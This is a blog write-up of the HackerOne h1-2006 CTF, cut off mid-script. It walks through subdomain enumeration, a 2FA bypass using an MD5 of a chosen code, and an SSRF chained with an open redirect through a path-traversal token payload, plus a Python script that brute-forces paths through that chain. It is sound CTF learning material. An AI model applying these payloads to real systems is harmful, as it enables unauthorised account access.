<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackerOne h1-2006 CTF write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="HackerOne h1-2006 CTF write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Here is my write-up of how I solved HackerOne h1-2006 CTF, definitely learned a lot of new things!" /><meta property="og:description" content="Here is my write-up of how I solved HackerOne h1-2006 CTF, definitely learned a lot of new things!" /><link rel="canonical" href="https://diego95root.github.io/posts/H1-2006-CTF/" /><meta property="og:url" content="https://diego95root.github.io/posts/H1-2006-CTF/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-09T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackerOne h1-2006 CTF write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"HackerOne h1-2006 CTF write-up","dateModified":"2020-06-09T00:00:00+02:00","datePublished":"2020-06-09T00:00:00+02:00","url":"https://diego95root.github.io/posts/H1-2006-CTF/","mainEntityOfPage":{"@type":"WebPage","@id":"https://diego95root.github.io/posts/H1-2006-CTF/"},"author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"Here is my write-up of how I solved HackerOne h1-2006 CTF, definitely learned a lot of new things!","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackerOne h1-2006 CTF write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackerOne h1-2006 CTF write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 9, 2020, 12:00 AM +0200"> Jun 9, 2020 <i class="unloaded">2020-06-09T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div></div><div class="post-content"> <img src="/assets/posts_details/H1CTF-data/images/header.png"><h1 id="hackerone-h1-2006-ctf-write-up-how-i-solved-it">HackerOne h1-2006 CTF write-up: How I solved it</h1><p>Hello everyone, in this post I will go over how I managed to solve the HackerOne h12006 CTF. It was the best CTF challenge I’ve ever played, not only because the way to solve it was realistic but also because it gave me insight into how to chain bugs, like SSRF with Open Redirects, or made me learn about Android, a topic I had never touched. Let’s start!</p><h2 id="challenge-description">Challenge description</h2><p>I first got to know about the challenge from Twitter:</p><p><em>Twitter post announcing the challenge</em></p><p><img src="/assets/posts_details/H1CTF-data/images/twitter.png" alt="Img" /></p><p>I then went to Hackerone and read the full description:</p><p><em>HackerOne CTF program description</em></p><p><img src="/assets/posts_details/H1CTF-data/images/description1.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/description2.png" alt="Img" /></p><p>Cool, so we get a root domain: <code class="highlighter-rouge">*.bountypay.h1ctf.com</code>. Let’s start the challenge!</p><h2 id="1-subdomain-enumeration">1. Subdomain enumeration</h2><p>I first used nahamsec’s crt.sh quick bash snippet to get myself a list of subdomains, as I thought that there wouldn’t be that many and we probably don’t need to bruteforce them.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>crtsh<span class="o">(){</span>
    curl <span class="nt">-fsSL</span> <span class="s2">"https://crt.sh/?q=%25.</span><span class="nv">$1</span><span class="s2">"</span> | <span class="nb">sort</span> <span class="nt">-n</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">grep</span> <span class="nt">-o</span> <span class="nt">-P</span> <span class="s1">'(?&lt;=\&lt;TD\&gt;).*(?=\&lt;\/TD\&gt;)'</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s1">'/white-space:normal/d'</span> | <span class="nb">grep</span> <span class="nv">$1</span>
<span class="o">}</span>
</pre></table></code></div></div><p><em>Obtained subdomains</em></p><p><img src="/assets/posts_details/H1CTF-data/images/subdomains1.png" alt="Img" /></p><p>To make sure that I didn’t miss anything I also used google to check and came across a <a href="https://subdomainfinder.c99.nl/scans/2020-05-24/h1ctf.com">subdomain finder scan</a> which contained the exact same results.</p><p><em>Double-checking in case I missed a subdomain</em></p><p><img src="/assets/posts_details/H1CTF-data/images/subdomains2.png" alt="Img" /></p><p>So all in all the subdomains we need to enumerate are:</p><ul><li><code class="highlighter-rouge">bountypay.h1ctf.com</code> / <code class="highlighter-rouge">www.bountypay.h1ctf.com</code></li><li><code class="highlighter-rouge">api.bountypay.h1ctf.com</code></li><li><code class="highlighter-rouge">app.bountypay.h1ctf.com</code></li><li><code class="highlighter-rouge">software.bountypay.h1ctf.com</code></li><li><code class="highlighter-rouge">staff.bountypay.h1ctf.com</code></li></ul><h3 id="main-subdomain-bountypayh1ctfcom">Main subdomain: <code class="highlighter-rouge">bountypay.h1ctf.com</code></h3><p>We don’t see much upon visiting the domain, just some login links to <code class="highlighter-rouge">staff.bountypay.h1ctf.com</code> and <code class="highlighter-rouge">app.bountypay.h1ctf.com</code>.</p><p><em>Subdomain content</em></p><p><img src="/assets/posts_details/H1CTF-data/images/sub-main.png" alt="Img" /></p><h3 id="app-subdomain-appbountypayh1ctfcom">App subdomain: <code class="highlighter-rouge">app.bountypay.h1ctf.com</code></h3><p>Nothing interesting either… just a login panel.</p><p><em>Subdomain content</em></p><p><img src="/assets/posts_details/H1CTF-data/images/sub-app.png" alt="Img" /></p><h3 id="staff-subdomain-staffbountypayh1ctfcom">Staff subdomain: <code class="highlighter-rouge">staff.bountypay.h1ctf.com</code></h3><p>Same as before.</p><p><em>Subdomain content</em></p><p><img src="/assets/posts_details/H1CTF-data/images/sub-staff.png" alt="Img" /></p><p>However, I notice something interesting, the URL is <code class="highlighter-rouge">https://staff.bountypay.h1ctf.com/?template=login</code>. I immediately tried to bruteforce keywords on the template parameter but the server returned empty responses. The only hit I had was with <code class="highlighter-rouge">https://staff.bountypay.h1ctf.com/?template=admin</code>, which returned <code class="highlighter-rouge">No Access to this resource</code>. Hmmm, still nothing to start with, but better to keep this in mind for the future, it may come in handy.</p><h3 id="api-subdomain-apibountypayh1ctfcom">Api subdomain: <code class="highlighter-rouge">api.bountypay.h1ctf.com</code></h3><p>This subdomain was more interesting!</p><p><em>Subdomain content</em></p><p><img src="/assets/posts_details/H1CTF-data/images/sub-api.png" alt="Img" /></p><p>I got some interesting stuff:</p><ul><li>First of all, they were using a REST API, which was nice to know in case I could access it later.</li><li>Secondly, notice the REST API is highlighted, I checked the source code and found that it was a Open URL Redirect. However, I found that it had a whitelist, as <a href="https://api.bountypay.h1ctf.com/redirect?url=https://test.com/search?q=REST+API">https://api.bountypay.h1ctf.com/redirect?url=https://test.com/search?q=REST+API</a> returned <code class="highlighter-rouge">URL NOT FOUND IN WHITELIST</code>. It seemed to have other subdomains, though: <code class="highlighter-rouge">https://api.bountypay.h1ctf.com/redirect?url=https://staff.bountypay.h1ctf.com/search?q=REST+API</code>. I couldn’t use it for anything at the moment, but it could be necessary later.</li></ul><p><em>Subdomain source code</em></p><p><img src="/assets/posts_details/H1CTF-data/images/sub-api-src.png" alt="Img" /></p><h3 id="software-subdomain-softwarebountypayh1ctfcom">Software subdomain: <code class="highlighter-rouge">software.bountypay.h1ctf.com</code></h3><p>Unfortunately, this subdomain was for internal use so I couldn’t access it. Still, I noted it down just in case.</p><p><em>Subdomain content</em></p><p><img src="/assets/posts_details/H1CTF-data/images/sub-software.png" alt="Img" /></p><h2 id="2-content-enumeration">2. Content enumeration</h2><p>At this point I knew I had to do some content discovery as there wasn’t much to start with, so I started up <code class="highlighter-rouge">ffuf</code> and started bruteforcing all subdomains. I started with a small wordlist of common files and directories and quickly got a hit on <code class="highlighter-rouge">app.bountypay.h1ctf.com</code>:</p><p><em>Content discovery with ffuf</em></p><p><img src="/assets/posts_details/H1CTF-data/images/content-discovery1.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/content-discovery2.png" alt="Img" /></p><p>Nice, now we have a github account to look at: <a href="https://github.com/bounty-pay-code">https://github.com/bounty-pay-code</a>:</p><p><em>Github account found</em></p><p><img src="/assets/posts_details/H1CTF-data/images/github1.png" alt="Img" /></p><p>There was only one repository, called <code class="highlighter-rouge">request-logger</code>, with a single file: <code class="highlighter-rouge">logger.php</code>.</p><p><em>Contents of the only file on the repository</em></p><p><img src="/assets/posts_details/H1CTF-data/images/github2.png" alt="Img" /></p><p>This was interesting, as it provided me with a file to look for: <code class="highlighter-rouge">bp_web_trace.log</code>.</p><p><em>Log file contents</em></p><p><img src="/assets/posts_details/H1CTF-data/images/github3.png" alt="Img" /></p><p>After base64 decoding it, the file contained some credentials and interesting stuff!</p><p><em>Decoded contents</em></p><p><img src="/assets/posts_details/H1CTF-data/images/github4.png" alt="Img" /></p><h2 id="3-accessing-account-2fa-bypass">3. Accessing account: 2FA Bypass</h2><p>I tried to use the gathered credentials, <code class="highlighter-rouge">brian.oliver:V7h0inzX</code>, in the staff subdomain but they didn’t work. Then I moved on to the app subdomain and succesfully logged in. There was a problem though, 2FA was in place.</p><p><em>2FA in place after log in</em></p><p><img src="/assets/posts_details/H1CTF-data/images/2fa.png" alt="Img" /></p><p>I immediately started up burp to capture the request and analyse it more easily:</p><p><em>Request analysis using burp</em></p><p><img src="/assets/posts_details/H1CTF-data/images/burp1.png" alt="Img" /></p><p>From here I tried different things, such as using the code I obtained from the log file, removing the <code class="highlighter-rouge">challenge</code> parameter, but without luck. Then it hit me, maybe the <code class="highlighter-rouge">challenge</code> parameter was just some kind of hash generated from <code class="highlighter-rouge">challenge_code</code> and the app was just checking <code class="highlighter-rouge">hash(challenge_code) == challenge</code>. So I tried with Md5 and to my surprise I was in! I used <code class="highlighter-rouge">1111111111</code> as <code class="highlighter-rouge">challenge_code</code> and <code class="highlighter-rouge">e11170b8cbd2d74102651cb967fa28e5</code> (<code class="highlighter-rouge">MD5(1111111111)</code>) as challenge.</p><p><em>Using burp repeater to guess solution</em></p><p><img src="/assets/posts_details/H1CTF-data/images/burp2.png" alt="Img" /></p><p>I was issued a token, <code class="highlighter-rouge">eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9</code>, which I knew was base64 encoded because the initial <code class="highlighter-rouge">ey</code> is always the starting part when encoding json strings. I decoded it and got <code class="highlighter-rouge">{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}</code>.</p><p>I then started to take a look at the dashboard but found that I couldn’t get any transactions, there seemed to be no data regardless of the date I chose.</p><p><em>App dashboard</em></p><p><img src="/assets/posts_details/H1CTF-data/images/dashboard1.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/dashboard2.png" alt="Img" /></p><h2 id="4-ssrf-chained-with-open-url-redirect-to-access-softwarebountypayh1ctfcom">4. SSRF chained with Open URL Redirect to access <code class="highlighter-rouge">software.bountypay.h1ctf.com</code></h2><p>I decided to inspect the request and found that it was returning the URL it queried and the data.</p><p><em>Ajax request response</em></p><p><img src="/assets/posts_details/H1CTF-data/images/dashboard3.png" alt="Img" /></p><p>What was interesting from this was that the URL it was querying was from the API and it contained the <code class="highlighter-rouge">account_id</code>: <code class="highlighter-rouge">{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&amp;year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}</code>. This meant that we could control the query and had a limited SSRF:</p><ul><li><code class="highlighter-rouge">{"account_id":"1","hash":"de235bffd23df6995ad4e0930baac1a2"}</code> as base64 in token returned <code class="highlighter-rouge">{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/1\/statements?month=01&amp;year=2020","data":"[\"Invalid Account ID\"]"}</code>.</li></ul><p>I then thought, what if we could chain this SSRF with something else? And then the redirect I had initially found on <code class="highlighter-rouge">software.bountypay.h1ctf.com</code> came to my mind. The idea was that we could use a path traversal payload in the token to access the redirect and then from there access resources from other subdomains. I first thought of accessing the <code class="highlighter-rouge">software</code> subdomain, as it was restricted by IP address.</p><ul><li>The final payload was <code class="highlighter-rouge">{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}</code> (note the <code class="highlighter-rouge">#</code> as it gets rid of the remaining <code class="highlighter-rouge">/statements?month=01&amp;year=2020</code>) and with it I got a login page:</li></ul><p><em>Login page of the software subdomain</em></p><p><img src="/assets/posts_details/H1CTF-data/images/ssrf.png" alt="Img" /></p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Software Storage<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-6 col-sm-offset-3"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">style=</span><span class="s">"text-align: center"</span><span class="nt">&gt;</span>Software Storage<span class="nt">&lt;/h1&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"/"</span><span class="nt">&gt;</span> …="username" class="form-control"&gt;
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"margin-top:7px"</span><span class="nt">&gt;&lt;label&gt;</span>Password:<span class="nt">&lt;/label&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;div&gt;&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">class=</span><span class="s">"form-control"</span><span class="nt">&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span> <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-success pull-right"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span> <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><h2 id="5-enumerating-the-software-subdomain">5. Enumerating the <code class="highlighter-rouge">software</code> subdomain</h2><p>This new access to the subdomain was interesting but had some limits, as I couldn’t make POST requests at the login panel. My next step was to enumerate, there is always not enough recon to be done. Obviously the steps to bruteforce files and directories were a few:</p><ol><li>Include the filename in the JSON token</li><li>Base64 encode the JSON token</li><li>Make the statements request with the JSON token as cookie</li></ol><p>So I decided to automate the process by writing a quick python script.</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">json</span>

<span class="c1"># generates the token with the path
</span><span class="k">def</span> <span class="nf">generateToken</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">token</span> <span class="o">=</span> <span class="s">'{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/'</span> <span class="o">+</span> <span class="n">path</span> <span class="o">+</span> <span class="s">'#","hash":"de235bffd23df6995ad4e0930baac1a2"}'</span>
    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">().</span><span class="n">replace</span><span class="p">(</span><span class="s">"="</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
            <span class="n">token</span> <span class="o">=</span> <span class="n">generateToken</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://app.bountypay.h1ctf.com/statements?month=02&amp;year=2020"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'token'</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>
                <span class="k">if</span> <span class="s">"404 Not Found"</span> <span class="ow">in</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)[</span><span class="s">'data'</span><span class="p">]:</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">"[404] {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">line</span><span class="p">))</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
